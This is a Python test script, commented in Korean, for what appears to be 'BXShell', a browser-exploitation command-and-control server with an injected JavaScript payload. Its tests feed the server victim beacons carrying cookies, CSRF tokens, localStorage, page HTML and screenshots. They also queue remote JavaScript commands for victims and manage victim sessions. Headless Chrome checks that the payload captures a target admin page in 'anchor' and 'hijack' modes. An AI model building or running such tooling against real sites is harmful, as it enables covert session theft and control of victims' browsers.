#!/usr/bin/env python3
"""BXShell v0.1.3 QA — v0.3 자동수집 + 세션 워크스페이스 영속화 + 휴지통 라이프사이클.

실행:  python3 qa/qa_v013.py     (C2 :7700, 대상 :8000 가동 중이어야 함)
주의:  Part C에서 C2를 재시작한다. Part D에서 headless Chrome으로 실 페이로드를 검증한다.
"""
import json, os, subprocess, time, urllib.request, uuid, base64

C2, TGT = "http://127.0.0.1:7700", "http://127.0.0.1:8000"
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, ".."))
SESS = os.path.join(ROOT, "sessions")
TRASH = os.path.join(SESS, ".trash")
PURGED_FILE = os.path.join(SESS, ".purged.json")
results, qa_sessions = [], []

def check(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" — {detail}" if detail else ""))

def req(url, data=None, method=None, headers=None, timeout=10):
    r = urllib.request.Request(url, data=data, method=method)
    if headers:
        for k, v in headers.items(): r.add_header(k, v)
    with urllib.request.urlopen(r, timeout=timeout) as resp:
        return resp.status, resp.read()

def jreq(url, data=None, method=None):
    st, b = req(url, json.dumps(data).encode() if data is not None else None, method)
    return st, json.loads(b)

def beacon(tag, vid, extra=None):
    body = json.dumps(dict({"id": vid}, **(extra or {}))).encode()
    return req(C2 + "/b/" + tag, body, headers={"Content-Type": "application/json"})

def restart_c2():
    """포트 7700 리스너를 종료하고 프로젝트 루트에서 C2를 재기동한다."""
    pid = subprocess.run(["lsof", "-tiTCP:7700", "-sTCP:LISTEN"],
                         capture_output=True, text=True).stdout.strip()
    if pid:
        subprocess.run(["kill", pid])
        time.sleep(1)
    subprocess.Popen(["nohup", "python3", os.path.join(ROOT, "c2", "server.py")],
                     cwd=ROOT, stdout=open(os.path.join(ROOT, "c2", "c2.log"), "a"),
                     stderr=subprocess.STDOUT, start_new_session=True)
    for _ in range(20):
        try:
            req(C2 + "/api/state", timeout=2); return True
        except Exception:
            time.sleep(0.5)
    return False

def newvid():
    v = "qa_" + uuid.uuid4().hex[:6]
    qa_sessions.append(v)
    return v

# ═══════ PART A: 자동수집 프로토콜 ═══════
print("== PART A: 자동수집 프로토콜 ==")
vid = newvid()
beacon("info", vid, {"url": TGT + "/admin", "bn": "A1", "title": "QA target",
                     "cookie": "qa=1", "ua": "qa-agent", "ls": "{}"})

st, b = req(C2 + "/config")
cfg = json.loads(b)
check("A01 GET /config 200 + 플래그 키", st == 200
      and all(k in cfg for k in ("screenshot", "html", "pageinfo")))

st, _ = req(C2 + "/api/config", json.dumps({"pageinfo": False}).encode(),
            headers={"Content-Type": "application/json"})
check("A02 /api/config 토글 반영", json.loads(req(C2 + "/config")[1])["pageinfo"] is False)
req(C2 + "/api/config", json.dumps({"pageinfo": True}).encode(),
    headers={"Content-Type": "application/json"})

pi = {"referrer": TGT + "/", "lang": "ko-KR", "platform": "MacIntel",
      "screen": "2560x1440", "viewport": "1280x900", "online": True,
      "ss": "{}", "meta": {"csrf": "tok123"}, "forms": []}
beacon("pageinfo", vid, pi)
d = jreq(C2 + "/api/state")[1]
check("A03 pageinfo → state + 파일", (d.get("pageinfo") or {}).get(vid, {}).get("lang") == "ko-KR"
      and json.load(open(os.path.join(SESS, vid, "pageinfo.json"))).get("lang") == "ko-KR")

# html 청크 3개 → 조립
chunks = [f"<html><body>part{i}</html>" for i in range(3)]
for n, c in enumerate(chunks):
    beacon("html", vid, {"n": n, "total": 3, "body": c})
d = jreq(C2 + "/api/state")[1]
check("A04 html 청크 조립 + html_t", vid in (d.get("has_html") or [])
      and (d.get("html_t") or {}).get(vid, "") != ""
      and open(os.path.join(SESS, vid, "htmldump.html")).read() == "".join(chunks))
st, b = req(C2 + "/api/htmldump?id=" + vid)
check("A04b /api/htmldump inline 서빙", st == 200 and b.decode() == "".join(chunks))

# screenshot 청크 2개 → jpg 바이너리 조립
sdata = base64.b64encode(os.urandom(2048)).decode()
schunks = [sdata[:1024], sdata[1024:]]
for n, c in enumerate(schunks):
    beacon("screenshot", vid, {"n": n, "total": 2, "body": c})
d = jreq(C2 + "/api/state")[1]
jpg = os.path.join(SESS, vid, "screenshot.jpg")
check("A05 screenshot → 바이너리 jpg + shot_t", vid in (d.get("has_screenshot") or [])
      and (d.get("shot_t") or {}).get(vid, "") != ""
      and os.path.exists(jpg) and open(jpg, "rb").read() == base64.b64decode(sdata)
      and not os.path.exists(os.path.join(SESS, vid, "screenshot.b64")))
st, b = req(C2 + "/api/screenshot?id=" + vid)
check("A05b /api/screenshot JSON 동일성", json.loads(b)["data"] == sdata)

beacon("console", vid, {"level": "log", "text": "qa-console-line"})
beacon("net", vid, {"method": "GET", "url": TGT + "/profile", "status": 200,
                    "body": "ok", "ms": 12})
d = jreq(C2 + "/api/state")[1]
check("A06 console 캡처 + 파일", any(x["text"] == "qa-console-line"
      for x in (d.get("console") or {}).get(vid, []))
      and "qa-console-line" in open(os.path.join(SESS, vid, "console.jsonl")).read())
check("A07 net 캡처 + 파일", any(r["url"].endswith("/profile")
      for r in json.loads(req(C2 + "/api/net?id=" + vid)[1]))
      and os.path.exists(os.path.join(SESS, vid, "net.jsonl")))

m = jreq(C2 + "/api/send", {"id": vid, "cmd": "1+1"})[1]
rows = open(os.path.join(SESS, vid, "commands.jsonl")).read()
check("A08 push 시점 commands.jsonl 기록", m.get("cid") in rows and "QUEUED" in rows)
beacon("result", vid, {"cid": m["cid"], "out": "2"})
d = jreq(C2 + "/api/state")[1]
check("A08b result → DONE", any(c.get("cid") == m["cid"] and c.get("state") == "DONE"
      for c in d.get("commands", [])))

# ═══════ PART B: vid sanitize (path traversal 차단) ═══════
print("== PART B: vid sanitize ==")
evil = "../../evil" + uuid.uuid4().hex[:4]   # purge 인덱스 충돌 방지
st, b = beacon("info", evil, {"url": TGT + "/admin", "bn": "B1"})
d = jreq(C2 + "/api/state")[1]
check("B01 traversal id → sanitize 등록",
      ("evil" + evil[-4:]) in d["victims"] and "../../evil" not in d["victims"]
      and not os.path.exists(os.path.join(ROOT, "evil" + evil[-4:])))
qa_sessions.append("evil" + evil[-4:])
# ═══════ PART C: 휴지통 라이프사이클 ═══════
print("== PART C: 휴지통 라이프사이클 ==")
tvid = newvid()
beacon("info", tvid, {"url": TGT + "/admin", "bn": "C1"})
check("C01 세션 생성 → 디렉터리", os.path.isdir(os.path.join(SESS, tvid)))

req(C2 + "/api/delete", json.dumps({"id": tvid}).encode(),
    headers={"Content-Type": "application/json"})
d = jreq(C2 + "/api/state")[1]
check("C02 delete → .trash 이동 + 숨김", not os.path.exists(os.path.join(SESS, tvid))
      and os.path.isdir(os.path.join(TRASH, tvid))
      and tvid in (d.get("trash") or {}) and tvid not in d["victims"])

st, b = beacon("info", tvid, {"url": TGT + "/admin", "bn": "C1"})
d = jreq(C2 + "/api/state")[1]
check("C03 삭제 세션 비컨 무시 (고스트 방지)", tvid not in d["victims"])

req(C2 + "/api/restore", json.dumps({"id": tvid}).encode(),
    headers={"Content-Type": "application/json"})
d = jreq(C2 + "/api/state")[1]
check("C04 restore → 목록 복귀", tvid in d["victims"]
      and not os.path.exists(os.path.join(TRASH, tvid))
      and tvid not in (d.get("trash") or {}))

beacon("info", tvid, {"url": TGT + "/admin", "bn": "C2"})
d = jreq(C2 + "/api/state")[1]
check("C05 복원 후 비컨 정상", tvid in d["victims"])

req(C2 + "/api/purge", json.dumps({"id": tvid}).encode(),
    headers={"Content-Type": "application/json"})
check("C06 purge → 디렉터리 완전 제거 + 인덱스",
      not os.path.exists(os.path.join(SESS, tvid))
      and not os.path.exists(os.path.join(TRASH, tvid))
      and tvid in json.load(open(PURGED_FILE)))
qa_sessions.remove(tvid)   # 이미 파기됨 — 정리 대상 제외

st, b = beacon("info", tvid, {"url": TGT + "/admin", "bn": "C3"})
d = jreq(C2 + "/api/state")[1]
check("C07 파기 세션 비컨 무시", tvid not in d["victims"])

check("C08 C2 재시작", restart_c2())
d = jreq(C2 + "/api/state")[1]
check("C08b 재시작 후 파기 vid 여전히 무시", tvid not in d["victims"]
      and tvid in json.load(open(PURGED_FILE)))
check("C08c 재시작 후 데이터 재로드 (pageinfo/스크린샷/DONE 명령)",
      (d.get("pageinfo") or {}).get(vid, {}).get("lang") == "ko-KR"
      and vid in (d.get("has_screenshot") or [])
      and any(c.get("vid") == vid and c.get("state") == "DONE" and c.get("out") == "2"
              for c in d.get("commands", [])))

# ═══════ PART D: 실브라우저 — 새 페이로드 anchor/hijack 캡처 ═══════
print("== PART D: 실브라우저 (새 페이로드) ==")
st, b = req(C2 + "/bx.js")
check("D01 payload에 bx.doc/shot/htmldump 캡슐화",
      b"__bx_frame" in b and b"bx.doc" in b.replace(b"window.__bx.doc", b"bx.doc")
      or (b"victimWin" in b and b"htmldump" in b and b"shot" in b))
CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

def chrome_visit(url, wait=14):
    p = subprocess.Popen([CHROME, "--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
                          "--disable-gpu", "--no-first-run",
                          f"--user-data-dir=/tmp/bxqa13_{uuid.uuid4().hex[:6]}", url],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(wait)
    p.terminate()
    try: p.wait(timeout=5)
    except Exception: pass

def wait_new(before, limit=16):
    for _ in range(limit):
        d = jreq(C2 + "/api/state")[1]
        new = [k for k in d["victims"] if k not in before]
        if new: return new
        time.sleep(1)
    return []

try:
    before = set(jreq(C2 + "/api/state")[1]["victims"].keys())
    chrome_visit(TGT + "/admin")                       # anchor 모드
    new = wait_new(before)
    check("D02 anchor 발동 (신규 피해자)", len(new) > 0, f"신규 {new}")
    if new:
        a = new[0]; qa_sessions.append(a)
        d = jreq(C2 + "/api/state")[1]
        check("D03 anchor 모드 + pageinfo", d["victims"][a].get("mode") == "anchor"
              and a in (d.get("pageinfo") or {}))
        html = req(C2 + "/api/htmldump?id=" + a)[1].decode()
        check("D04 anchor htmldump = 실제 페이지 (껍데기 아님)",
              "<h3>" in html and "관리자 검토" in html and "홈" in html)
        time.sleep(4)                                   # bx.shot 청크 도착 대기
        jpg = os.path.join(SESS, a, "screenshot.jpg")
        d = jreq(C2 + "/api/state")[1]
        check("D05 anchor 스크린샷 캡처 (실제 뷰)",
              a in (d.get("has_screenshot") or []) and os.path.exists(jpg)
              and os.path.getsize(jpg) > 1000,
              f"size={os.path.getsize(jpg) if os.path.exists(jpg) else 0}")

        before2 = set(jreq(C2 + "/api/state")[1]["victims"].keys())
        chrome_visit(TGT + "/admin?xfo=1")              # hijack 모드
        new2 = wait_new(before2)
        qa_sessions += new2
        h = new2[0] if new2 else ""
        html2 = req(C2 + "/api/htmldump?id=" + h)[1].decode() if h else ""
        check("D06 hijack htmldump = 실제 페이지", h and "<h3>" in html2 and "관리자 검토" in html2)
except FileNotFoundError:
    check("D02 실브라우저", False, "Chrome 실행 불가")

# ═══════ 자체 정리 + 요약 ═══════
print("== 자체 정리: QA 세션 purge ==")
for s in set(qa_sessions):
    try: req(C2 + "/api/purge", json.dumps({"id": s}).encode())
    except Exception: pass
d = jreq(C2 + "/api/state")[1]
leftover = [s for s in set(qa_sessions) if s in d["victims"] or s in (d.get("trash") or {})]
check("자체 정리: QA 세션 전부 제거", not leftover, f"잔여 {leftover}")

ok = sum(1 for _, s, _ in results if s)
print("\n" + "═" * 60)
print(f" QA 결과: {ok}/{len(results)} PASS")
for name, s, detail in results:
    if not s: print(f"  FAIL → {name} {detail}")
print("═" * 60)
